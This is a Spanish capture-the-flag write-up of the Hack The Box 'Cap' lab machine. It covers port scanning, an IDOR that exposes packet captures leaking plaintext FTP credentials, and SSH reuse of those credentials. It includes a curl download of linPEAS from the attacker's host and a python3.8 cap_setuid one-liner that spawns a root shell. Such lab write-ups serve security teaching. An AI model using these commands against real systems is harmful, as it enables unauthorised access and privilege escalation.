---
title: Cap
description: HTB Cap machine writeup – PCAP IDOR leakage and Linux capability privilege escalation
tags:
  - hackthebox
  - pcap
  - idor
  - linux
  - capabilities
  - privesc
difficulty: easy
platform: hackthebox
os: linux
vector: pcap-leakage
author: fmol107
---
![](img/Cap_image.png)

# [Cap](https://www.hackthebox.com/machines/Cap)

> Linux · Easy · Hack The Box

## 1. Basic Information

- **Machine name:** Cap  
- **Platform:** Hack The Box  
- **IP:** 10.10.10.245  
- **Operating System:** Ubuntu Linux  
- **Difficulty:** Easy  
- **Primary attack vector:** PCAP IDOR leakage + Linux capabilities  
- **Initial access:** Plaintext FTP credentials leaked in PCAP  
- **Privilege escalation:** Misconfigured `cap_setuid` on python3.8  
- **Date:** 2026-01-08

## 2. Summary

Máquina con un dashboard que expone capturas PCAP accesibles sin control, lo que permite obtener credenciales FTP en texto claro y escalar a root mediante capabilities mal configuradas en python3.8.

## 3. Enumeration

### 3.1 Network discovery (Nmap)

Se realiza un escaneo completo de puertos TCP para identificar superficie de ataque y, después, un escaneo con detección de servicios/versiones sobre los puertos abiertos.

#### 3.1.1 Full port scan (TCP)

```bash
nmap -sS -p- --open --min-rate 5000 -n -Pn -vvv -oN iniScanCap.txt 10.10.10.245

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```


#### 3.1.2 Service/version scan

```bash
nmap -sCV -p 21,22,80 -Pn -vvv -oN verScanCap.txt 10.10.10.245

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; 
80/tcp open  http    syn-ack ttl 63 gunicorn
|_http-server-header: gunicorn
| http-methods: Supported Methods: OPTIONS HEAD GET
|_http-title: Security Dashboard
```

Nmap revela tres puertos abiertos: **FTP (21), SSH (22) y HTTP (80)**. El servicio web parece estar servido por **gunicorn** y muestra el título **“Security Dashboard”**.

### 3.2 FTP

Vamos a comprobar si el servicio FTP permite **acceso anónimo**.

```bash
Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:fmol): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp>
```

El login falla, por lo que **anonymous está deshabilitado**. Se continúa con la enumeración del servicio web.

### 3.3 HTTP

Se identifica un servicio web en el puerto 80. Un reconocimiento inicial confirma que la aplicación está servida mediante **[gunicorn](https://gunicorn.org/)** y corresponde a un **Security Dashboard**.

```bash
whatweb http://10.10.10.245
http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```


Al acceder a la aplicación web se presenta un panel con varias secciones relacionadas con la monitorización del sistema.

http://10.10.10.245/

![](img/cap_web.png)

**IP Config (`/ip`)**  
Muestra información de red del sistema, similar a la salida de `ifconfig`.

http://10.10.10.245/ip

![](img/cap_web_ip.png)

**Network Status (`/netstat`)**  
Devuelve el estado de las conexiones de red, equivalente a la salida de `netstat`.

http://10.10.10.245/netstat

![](img/cap_web_netstat.png)



La opción **“Security Snapshot (5 Second PCAP + Analysis)”** genera una captura de tráfico de red de 5 segundos y permite descargarla posteriormente.

http://10.10.10.245/data/4

![](img/cap_web_data_4.png)

Cada captura se almacena bajo una ruta con el formato:
`/data/<id>`

Ejemplo:
`http://10.10.10.245/data/4`

![](img/cap_web_data_4.png)

Tras generar una captura, se realiza tráfico propio (por ejemplo, un `ping`) y se analiza el archivo descargado, comprobando que únicamente contiene tráfico generado por el usuario actual.

![](img/wireshark_4_pcap.png)

#### 3.3.2 IDOR – Packet capture disclosure

Se observa que el identificador numérico en la ruta `/data/<id>` es **incremental**. Al modificar manualmente este valor, es posible acceder a capturas que no han sido generadas por el usuario actual.

Por ejemplo:
`http://10.10.10.245/data/0`

Además, las capturas pueden descargarse directamente mediante:
`http://10.10.10.245/download/0`

Este comportamiento corresponde a una **Insecure Direct Object Reference (IDOR)**, ya que la aplicación no valida la propiedad de los recursos antes de permitir su acceso.

## 4. Foothold

El archivo **`0.pcap`**, accesible mediante el IDOR identificado previamente, contiene tráfico **FTP no cifrado**.

![](img/wireshark_0_pcap.png)

Al analizar la captura con Wireshark se observa el proceso de autenticación en texto claro, lo que permite obtener las credenciales del usuario **`nathan:Buck3tH4TF0RM3!`**.

Aunque estas credenciales **no son válidas para iniciar sesión vía FTP**, pertenecen a un **usuario existente en el sistema** y pueden reutilizarse para acceder mediante **SSH**, lo que proporciona acceso inicial a la máquina.

```bash
ssh nathan@10.10.10.245

nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```


## 5. Privilege Escalation

Una vez obtenido acceso como el usuario **nathan**, se procede a la enumeración local en busca de vectores de escalada de privilegios. Para ello se utiliza la herramienta **linPEAS**.

### 5.1 Enumeración con linPEAS

Se despliega un servidor HTTP en la máquina atacante para facilitar la transferencia del script.

```bash
sudo python -m http.server 80
```

![](img/python3_http.server.png)


Desde la máquina objetivo se descarga y ejecuta **linpeas.sh**.

```bash
curl -X GET http://10.10.15.54/linpeas.sh -o li.sh
```

![](img/curl_X_GET_linpeas.png)
```bash
chmod +x linpeas.sh
./linpeas.sh
```

Durante la ejecución de linPEAS se identifican varios hallazgos, siendo el más relevante la presencia de **capacidades asignadas a binarios**.

### 5.2 Linux Capabilities

El reporte muestra que el binario **`/usr/bin/python3.8`** tiene capacidades configuradas.

![](img/Capabilities.png)

Se confirma manualmente con:

```bash
getcap /usr/bin/python3.8
```

```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

La capacidad **`cap_setuid`** permite a un proceso cambiar su UID sin necesidad del bit SUID, lo que posibilita elevar privilegios a **root**. Este comportamiento no es el predeterminado y representa un vector claro de escalada.

### 5.3 Escalada a root

Según la documentación de **[GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities)**, Python puede abusar de esta capacidad para ejecutar comandos como UID 0.

Ejecutando el siguiente comando se obtiene una shell con privilegios de **root**:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![](img/Pasted%20image%2020260109002155.png)

Con esto se completa la escalada de privilegios y se obtiene acceso total al sistema.